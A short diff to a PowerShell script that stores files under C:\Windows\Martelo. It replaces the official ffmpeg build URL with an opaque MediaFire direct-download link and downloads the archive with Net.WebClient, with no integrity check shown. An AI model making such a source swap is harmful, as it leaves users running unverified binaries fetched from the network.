@@ -16,7 +16,7 @@ $outFile = "C:\Windows\Martelo\fotovideomail.ps1"
 
 
 # Define the URL to download ffmpeg
-$ffmpegUrl = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-git-essentials.7z"
+$ffmpegUrl = "https://download1514.mediafire.com/ugws51fg3pdg-4lCrTMYGQkNUX3cocwu60WUOY9qPQllf8Jkhk_GhwCoNjyrFKZp3hrN7zVnSMAi9EGoR6OjkHKXNA22iw-gvQG5Tt6Ry3yHaJfWE1_qAhv_d0KP50F3j1sWJPAKNyKDPR6jpzAE6oK3wi0tuOW-BZsFMScCjXwIHhQ/67h7oehtvsjgyi3/ffmpeg.7z"
 $ffmpegDownloadPath = "C:\Windows\Martelo\ffmpeg.7z"
 $ffmpegExtractPath = "C:\Windows\Martelo"
 (new-object Net.WebClient).DownloadFile($ffmpegUrl, $ffmpegDownloadPath)
